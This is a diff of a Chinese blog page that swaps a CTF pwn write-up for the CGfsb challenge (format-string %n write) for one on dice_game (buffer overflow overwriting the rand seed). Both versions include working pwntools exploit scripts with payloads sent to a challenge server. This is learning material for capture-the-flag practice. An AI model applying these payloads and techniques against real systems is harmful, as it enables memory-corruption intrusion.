@@ -6,25 +6,25 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>攻防世界新手区CGfsb | HandsomeJack</title>
+  <title>攻防世界进阶区dice_game | HandsomeJack</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="[攻防世界]新手区CGfsb依旧是先放到linux里扫一下，看看文件属性及开启的保护措施开了canary和nx，即没法直接覆盖返回地址和使用shellcode，题目里提示了prinf的作用，可以着重看看prinf用32位IDA打开，既有system，也有cat flag">
+  <meta name="description" content="[攻防世界]进阶区dice_game还是先看文件属性及保护措施除了canary基本都开了，应该是要栈溢出来做题看字符串窗口发现没有system也没有bash，一开始还以为给的libc是让我调用system的，后来发现在sub_B28这个函数里，有读取flag的操作，所以只要进入sub_B28，即可拿到flag">
 <meta name="keywords" content="pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="攻防世界新手区CGfsb">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;08&#x2F;CGfsb&#x2F;index.html">
+<meta property="og:title" content="攻防世界进阶区dice_game">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;19&#x2F;dice_game&#x2F;index.html">
 <meta property="og:site_name" content="HandsomeJack">
-<meta property="og:description" content="[攻防世界]新手区CGfsb依旧是先放到linux里扫一下，看看文件属性及开启的保护措施开了canary和nx，即没法直接覆盖返回地址和使用shellcode，题目里提示了prinf的作用，可以着重看看prinf用32位IDA打开，既有system，也有cat flag">
+<meta property="og:description" content="[攻防世界]进阶区dice_game还是先看文件属性及保护措施除了canary基本都开了，应该是要栈溢出来做题看字符串窗口发现没有system也没有bash，一开始还以为给的libc是让我调用system的，后来发现在sub_B28这个函数里，有读取flag的操作，所以只要进入sub_B28，即可拿到flag">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;08&#x2F;CGfsb&#x2F;a.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;08&#x2F;CGfsb&#x2F;b.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;08&#x2F;CGfsb&#x2F;c.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;08&#x2F;CGfsb&#x2F;d.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;08&#x2F;CGfsb&#x2F;e.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;08&#x2F;CGfsb&#x2F;f.png">
-<meta property="og:updated_time" content="2020-02-08T02:28:40.198Z">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;19&#x2F;dice_game&#x2F;a.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;19&#x2F;dice_game&#x2F;b.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;19&#x2F;dice_game&#x2F;c.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;19&#x2F;dice_game&#x2F;d.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;19&#x2F;dice_game&#x2F;e.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;19&#x2F;dice_game&#x2F;f.png">
+<meta property="og:updated_time" content="2020-02-19T01:59:16.001Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;08&#x2F;CGfsb&#x2F;a.png">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;19&#x2F;dice_game&#x2F;a.png">
   
     <link rel="alternative" href="/atom.xml" title="HandsomeJack" type="application/atom+xml">
   
@@ -189,47 +189,41 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-CGfsb" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-dice_game" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      攻防世界新手区CGfsb
+      攻防世界进阶区dice_game
     </h1>
   
 
         
-        <a href="/2020/02/08/CGfsb/" class="archive-article-date">
-  	<time datetime="2020-02-08T02:26:37.343Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-08</time>
+        <a href="/2020/02/19/dice_game/" class="archive-article-date">
+  	<time datetime="2020-02-19T01:57:02.050Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-19</time>
 </a>
         
       </header>
-<div align="center" class="post-count">字数：630字 | 预计阅读时长：2分钟</div>
+<div align="center" class="post-count">字数：464字 | 预计阅读时长：1分钟</div>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="攻防世界-新手区CGfsb"><a href="#攻防世界-新手区CGfsb" class="headerlink" title="[攻防世界]新手区CGfsb"></a>[攻防世界]新手区CGfsb</h1><p>依旧是先放到linux里扫一下，看看文件属性及开启的保护措施<br><img src="a.png" alt="checksec\~checksec\~checksec~"><br>开了canary和nx，即没法直接覆盖返回地址和使用shellcode，题目里提示了prinf的作用，可以着重看看prinf<br>用32位IDA打开，既有system，也有cat flag</p>
+        <h1 id="攻防世界-进阶区dice-game"><a href="#攻防世界-进阶区dice-game" class="headerlink" title="[攻防世界]进阶区dice_game"></a>[攻防世界]进阶区dice_game</h1><p>还是先看文件属性及保护措施<br><img src="a.png" alt="checksec下"><br>除了canary基本都开了，应该是要栈溢出来做题<br>看字符串窗口发现没有system也没有bash，一开始还以为给的libc是让我调用system的，后来发现在sub_B28这个函数里，有读取flag的操作，所以只要进入sub_B28，即可拿到flag<br><img src="b.png" alt="sub_B28函数"></p>
 <a id="more"></a>
-<p><img src="b.png" alt=""><br>再看主函数的伪代码<br><img src="c.png" alt=""><br>这个程序流程就是让你输入你的名字和要留下的信息，它就会说你好，并用printf输出你留下的信息。如果pwnme的值为8，那么判断成立就会直接执行system(“cat flag”)拿到flag，否则输出Thank you<br><img src="d.png" alt=""><br>第23行的这个printf不是正确的用法，会产生格式化字符串漏洞<br>printf正确用法是printf(“格式化字符串，……” , 参量，……)，比如输出一个字符串a应该用printf(“%s”,a)，但<strong>如果写成了printf(a),就会出现格式化字符串漏洞，如果a是”%x”，那么printf(a)就会输出它后面的内存中的数据</strong>。<br><img src="e.png" alt=""><br>61即 ‘a’ 的ASCII码，61616161即为 ‘aaaa’，可以看到输入的 ‘aaaa’ 偏移了10位，如果你不确定自己数的对不对，可以验证一下，用 ‘%10$x’ ，这个可以直接查看第十位的数据<br><img src="f.png" alt=""><br>偏移的确是10，所以输出的也是61616161<br>格式化字符串中，有一个%n比较特殊，<strong>%n可以将它前面已打印的字符个数赋值给后面它对应的参数</strong>，也许看起来有点绕口。。。举个栗子↓↓</p>
-<blockquote>
-<p>来自于<a href="https://stackoverflow.com/questions/3401156/what-is-the-use-of-the-n-format-specifier-in-c" target="_blank" rel="noopener">stack overflow</a><br>#include &lt;stdio.h&gt;<br>int main(){<br>int val;<br>printf(“blah %n blah\n”, &amp;val);<br>printf(“val = %d\n”, val);<br>return 0;<br>}<br>output:<br>blah  blah<br>val = 5</p>
-</blockquote>
-<p>%n前的字符个数为5，所以将5赋值给了val。但是好像Windows上不让用%n赋值….所以别再Windows下试了</p>
+<p>运行一下这个程序发现是个猜数游戏，看main函数中的while部分<br><img src="c.png" alt="while部分"><br>可以发现猜对50次即可进入函数sub_B28，从而拿到flag<br>而其中的sub_A20就是判断猜数正不正确的函数<br><img src="d.png" alt="sub_A20函数"><br>而判断的标准就是输入的数是否等于v2，而 <em>v2 = rand() % 6 + 1</em> ，v2是有rand函数产生的1~6的伪随机数，如果能得到seed值或修改成已知值，那么就可以用循环通过50轮判断<br>而main函数里，存在一个read溢出，buf只有50位，但read了80位<br><img src="e.png" alt=""><br>看main的栈可知，buf正好在seed上方，所以可以用buf溢出来更改seed值<br><img src="f.png" alt="栈分布"><br>已知seed后，调用libc中的srand和rand即可得到每次的伪随机值，循环输入通过50轮即可拿到flag</p>
 <h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><ol>
-<li>第一次运行程序，name随便输，在输入message时利用%x计算输入位置偏移</li>
-<li>第二次运行程序，name随便输，在输入message时，先输入pwnme的地址</li>
-<li>利用  <em>%偏移$n</em>  改变pwnme的值为8</li>
+<li>输入名字时，利用栈溢出来覆盖seed值变成已知值</li>
+<li>写脚本，调用libc的srand(seed)，再用 rand() % 6 + 1 生成每次的伪随机数，循环50次传给程序</li>
 <li>拿到flag<h2 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h2></li>
 </ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x0804A068</span>) + <span class="string">'aaaa%10$n'</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,<span class="number">56666</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'tell me your name:'</span>,<span class="string">'abcd'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'your message please:'</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> * <span class="comment">#用于调用外部函数库</span></span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">'libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x40</span> + p64(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,<span class="number">30484</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'know your name: '</span>,payload)</span><br><span class="line"></span><br><span class="line">libc.srand(<span class="number">1</span>) <span class="comment">#如果覆盖种子值为1，这里就写1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>): <span class="comment">#循环50次提交</span></span><br><span class="line">    a = libc.rand()%<span class="number">6</span> + <span class="number">1</span> <span class="comment">#生成1~6的伪随机数</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Give me the point(1~6): '</span>,str(a))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <p>payload解释：</p>
 <ol>
-<li>p32(0x0804A068)：pwnme的地址，双击pwnme即可查看</li>
-<li>‘aaaa%10$n’：p32打包后的数据是4位的，但是要赋值8给pwnme，所以再填充4个a，然后把8赋值给第十个参数，即pwnme的地址对应的值</li>
+<li>‘a’*0x40：填充buf和seed之间，让buf溢出至seed</li>
+<li>p64(1)：覆盖seed值为 1</li>
 </ol>
-<p>关于格式化字符串漏洞的原理，可以看看<a href="https://blog.csdn.net/qq_43394612/article/details/84900668" target="_blank" rel="noopener">这篇文章</a></p>
 
       
 
@@ -325,7 +319,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://yoursite.com/2020/02/08/CGfsb/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://yoursite.com/2020/02/19/dice_game/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -339,18 +333,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2020/02/17/forgot/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          攻防世界进阶区forgot
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020/02/07/level3/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">攻防世界新手区get_shell、level3</div>
+    <a href="/2020/02/18/Mary_Morton/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">攻防世界进阶区Mary_Morton</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -377,7 +362,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#攻防世界-新手区CGfsb"><span class="toc-number">1.</span> <span class="toc-text">[攻防世界]新手区CGfsb</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#思路："><span class="toc-number">1.1.</span> <span class="toc-text">思路：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP："><span class="toc-number">1.2.</span> <span class="toc-text">EXP：</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#攻防世界-进阶区dice-game"><span class="toc-number">1.</span> <span class="toc-text">[攻防世界]进阶区dice_game</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#思路："><span class="toc-number">1.1.</span> <span class="toc-text">思路：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP："><span class="toc-number">1.2.</span> <span class="toc-text">EXP：</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
@@ -402,7 +387,7 @@
 <script src="https://billts.site/js/gitment.js"></script>
 <script>
 var gitment = new Gitment({
-  id: "http://yoursite.com/2020/02/08/CGfsb/",
+  id: "http://yoursite.com/2020/02/19/dice_game/",
   owner: 'SpHandsomeJack',
   repo: 'gitment-comment',
   oauth: {
